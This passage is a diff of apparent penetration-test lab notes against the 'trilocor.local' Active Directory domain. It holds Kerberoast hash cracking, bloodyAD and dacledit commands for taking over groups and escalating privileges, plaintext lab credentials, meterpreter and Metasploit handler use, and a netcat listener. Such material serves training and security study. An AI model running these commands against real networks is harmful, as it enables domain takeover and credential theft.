 $krb5tgs$23$*divanov$ad.trilocor.local$nonexistent/BLAHBLAH*$5BE140A383E62D711BC11A40CC43EA08$155531EDF2FA78EADF9445EBC7FE5E203CD1B3F8C06FAE63693E0B348AC9D3F383ABC730459AFE82D6B34D388EF40EED3C69BEC43C689A1C6C9947DDF443E60266C90BCF9C11D5F722197BF2D9D64C1E8988605BFF7861707CEDAD9F1463D03475CFD6BF93E409CCA02A53A29327B0A60DE89187137006036BD92E4FC3641AC9922DE8982E9E74C251111B1B6F06D06644810603AA41989F0189A338599B455BAE6960B1641737AD999B9FB46E8DA7D8061919895692A763D7AED59C4F3C8EFA4DAA9DB8FB74C404F71A239F5B7F14D58704AB2D6B62158F84C219AB81A7D0CD66F9882CB0A8B750D2A38974859FC9FDCADF37397011E89E22947F0F8F78CC6300C307C9B0F6A91AF35ECE1568353416467F561B015CDE379FAC775E50470F8E403797C96B167E9F0069AF440FCE015CE999D58C16EAFFE7882F7A2FB3E5A4217E75FBB43CE14E637551DE34950D3A03C9BA28FAD0AEB150A72F120C57D31774DC0A5313917A9765C6AC2E63FE0C238FB0CB012CD395424748FE9B9DDAA7053D48EADA4150B103FF09AE8B960D1BF6C123DC3BFF3AC1EF7ED2558E9824820667069CAC6109007388B1600EBC0274605B40E848EB1BFF0B3EF6A8A58BDC8CE209D90548AD8B00C454AABB096A3472E61209A5BB6641589CD7D6BA7887D7E4E5047FEB9785D29108EF6B15A20465D0C569F1EC4F4AF276CC84B3421C01379144044A53A9DD303EC9CD20D09C4D0087EA4E0F0722F0D8A3D42283C67E1B90C6A04EDC3616F921966C06126C9B3B69ED264AA7E91E6FFCB356C4E016AEE4D3ABE544C0D458B31088E74E8B623006E4DB04DF213F708AC29B1CDBFFE576769E99E90A525B8D5D31EFF7A60576396304037FDE1490CF2D2E9D7B95B5EC1E672F276189C301BAE9E9A6CB6163478251ED358B4A802955BA75F3E202AC9C131D9CDD6E535D3E611AAC15463815FDE1EB058FF5E811A1566C8C9C61CDC08B11B11472B3FC9815C561EA920B9755C1F657ADBB29D71A3A0C5555B9BE9DDAA56D20291ED2B71F6C32F78C1F8D224BAAD52EC04650B199E209D29514ABE4766072B56F0F510C4D51AF5DF46EC20F7EC1D6D200942135B8B7A9F32642435E9E948BA29ED7D97E8C7CCC6DC671AECD4748A19ACE05AB32CCFCF404015A3AD1D4CBEA947EA6B62B893ED12C582F517FBE029AAEADE410F7C51C9B748396EF07FEC50089EF78086FCA700AA75B26EA680AF84B3D0D3D4D95F91FE9D6FB8EA249B908AF0974FA361565CDCBD3919393C47F870EFC134BD2DF9795A1B796D369B6FB6924266AAD3C985111D002E84718B713DD3E9CE2CAAE65B5AAD7272ACADE96B2DF456FA2D1608F4B85441927C1D497301A56759B0F1AC54EEBB34DFFDBBBEADE99FADDC0549F5A7E5F2DA8CA14D34C2E218056B851839AFAE608DEC81358897BE2EBD659D2622E0087F0A6B009FBD5D7DD6BD7A02121A0F38AFE7E3EB4F956CEE1D8B7D907463E44E6F3C428CC602433C5C5E88A55D765D8510B70CBE1451B65DCAE70C9A97D38C733DA0C0F938C252D21F66F68FF31ED465534CAC4A8BB55F1B1DB2CAB4CF98FDD20C8E0E719B6778F651CBD3F00A636949D6E6359B0850CAC01FC85536C83D90A21801EB05EEB1A8EC3237798BE2FBBF8B4709D807839A33D307FAD5DEC15BCCD5B714E5C596C6C2A724109C1334BA3D6B05F2C
 ```
 
-![[Pasted image 20260124155904.png]]
+![image-center](/assets/images/Pasted image 20260124155904.png)
 
 ```bash
 john hash_divanov -w=/usr/share/wordlists/rockyou.txt  
@@ -2558,9 +2558,9 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-![[Pasted image 20260124155943.png]]
+![image-center](/assets/images/Pasted image 20260124155943.png)
 
-![[Pasted image 20260124160038.png]]
+![image-center](/assets/images/Pasted image 20260124160038.png)
 
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 add groupMember 'MSSP CONNECT' divanov
@@ -2571,7 +2571,7 @@ proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 1
 [+] divanov added to MSSP CONNECT
 ```
 
-![[Pasted image 20260124160056.png]]
+![image-center](/assets/images/Pasted image 20260124160056.png)
 
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 set owner 'TIER I INFRASTRUCTURE' divanov
@@ -2582,7 +2582,7 @@ proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 1
 [+] Old owner S-1-5-21-4182522048-3082878045-1431402319-512 is now replaced by divanov on TIER I INFRASTRUCTURE
 ```
 
-![[Pasted image 20260124160414.png]]
+![image-center](/assets/images/Pasted image 20260124160414.png)
 
 ```bash
 proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'divanov' -target-dn 'CN=TIER I INFRASTRUCTURE,OU=SECURITY GROUPS,OU=CORP,DC=AD,DC=TRILOCOR,DC=LOCAL' 'ad.trilocor.local'/'divanov':'Dimitris2001' -dc-ip 172.16.139.3
@@ -2597,7 +2597,7 @@ Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its a
 [*] DACL backed up to dacledit-20260124-201701.bak
 [*] DACL modified successfully!
 ```
-![[Pasted image 20260125001822.png]]
+![image-center](/assets/images/Pasted image 20260125001822.png)
 
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 add groupMember 'TIER I INFRASTRUCTURE' divanov
@@ -2607,7 +2607,7 @@ proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 1
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
 [+] divanov added to TIER I INFRASTRUCTURE
 ```
-![[Pasted image 20260125001924.png]]
+![image-center](/assets/images/Pasted image 20260125001924.png)
 
 ```bash
 proxychains ldapsearch -x -H ldap://172.16.139.3 \                                                                                         
@@ -2689,7 +2689,7 @@ result: 0 Success
 # numReferences: 3
 
 ```
-![[Pasted image 20260125002034.png]]
+![image-center](/assets/images/Pasted image 20260125002034.png)
 
 
 ```powershell
@@ -2714,9 +2714,9 @@ Version: v1.0.3 (9dad6e1) - 01/24/26 - Ronnie Flathers @ropnop
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK                                                                                                           
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
 ```
-![[Pasted image 20260125002305.png]]
+![image-center](/assets/images/Pasted image 20260125002305.png)
 
-![[Pasted image 20260125002450.png]]
+![image-center](/assets/images/Pasted image 20260125002450.png)
 
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'FILESHARE ADMINS' fjenkins_adm
@@ -2726,7 +2726,7 @@ proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --d
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
 [+] fjenkins_adm added to FILESHARE ADMINS
 ```
-![[Pasted image 20260125002810.png]]
+![image-center](/assets/images/Pasted image 20260125002810.png)
 
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'HELP DESK' fjenkins_adm 
@@ -2736,7 +2736,7 @@ proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --d
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
 [+] fjenkins_adm added to HELP DESK
 ```
-![[Pasted image 20260125002818.png]]
+![image-center](/assets/images/Pasted image 20260125002818.png)
 
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'DESKTOP ADMINS' fjenkins_adm
@@ -2746,7 +2746,7 @@ proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --d
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
 [+] fjenkins_adm added to DESKTOP ADMINS
 ```
-![[Pasted image 20260125002907.png]]
+![image-center](/assets/images/Pasted image 20260125002907.png)
 
 escritura en deparment shares
 
@@ -2781,9 +2781,9 @@ SMB         172.16.139.3    445    DC01             SYSVOL          READ        
 SMB         172.16.139.3    445    DC01             Users           READ            Domain Users
 SMB         172.16.139.3    445    DC01             ZZZ_archive                     Archives
 ```
-![[Pasted image 20260125004034.png]]
+![image-center](/assets/images/Pasted image 20260125004034.png)
 
-![[Pasted image 20260125010058.png]]
+![image-center](/assets/images/Pasted image 20260125010058.png)
 ```bash
  proxychains impacket-smbclient ad.trilocor.local/fjenkins_adm:'fJ#nk!n$$@123'@172.16.139.3 -dc-ip 172.16.139.3
 [proxychains] config file found: /etc/proxychains4.conf
@@ -2804,7 +2804,7 @@ Type help for list of commands
 ```
 
 crack hash axx
-![[Pasted image 20260125010208.png]]
+![image-center](/assets/images/Pasted image 20260125010208.png)
 ```bash
 john hash_backup.txt -w=/usr/share/wordlists/rockyou.txt  
 Using default input encoding: UTF-8
@@ -2820,9 +2820,9 @@ Session completed.
 
 
 https://www.axantum.com/download
-![[Pasted image 20260125013615.png]]
+![image-center](/assets/images/Pasted image 20260125013615.png)
 
-![[Pasted image 20260125013626.png]]
+![image-center](/assets/images/Pasted image 20260125013626.png)
 
 
 
@@ -2843,7 +2843,7 @@ meterpreter > upload valid_users C:\\programdata\\valid_users
 [*] Completed  : /home/zs1n/Desktop/CPTS/valid_users -> C:\programdata\valid_users
 ```
 
-![[Pasted image 20260122194629.png]]
+![image-center](/assets/images/Pasted image 20260122194629.png)
 
 ```bash
 *Evil-WinRM* PS C:\programdata> .\kerbrute.exe
@@ -2929,7 +2929,7 @@ msf exploit(multi/handler) > run
 ```
 
 
-![[Pasted image 20260121222457.png]]\
+![image-center](/assets/images/Pasted image 20260121222457.png)\
 
 
 ```bash
@@ -2952,15 +2952,15 @@ println "[+] EXE binario guardado correctamente en: " + outputPath
 println "[+] Tamaño esperado: " + decodedBytes.length + " bytes"
 ```
 
-![[Pasted image 20260122130520.png]]
+![image-center](/assets/images/Pasted image 20260122130520.png)
 
-![[Pasted image 20260122130528.png]]
+![image-center](/assets/images/Pasted image 20260122130528.png)
 
 ```bash
 root@WEB-DMZ01:~# iptables -I INPUT -p tcp --dport 443 -j ACCEPT
 ```
 
-![[Pasted image 20260122130545.png]]
+![image-center](/assets/images/Pasted image 20260122130545.png)
 
 ```bash
 root@WEB-DMZ01:~# nc -nvlp 443
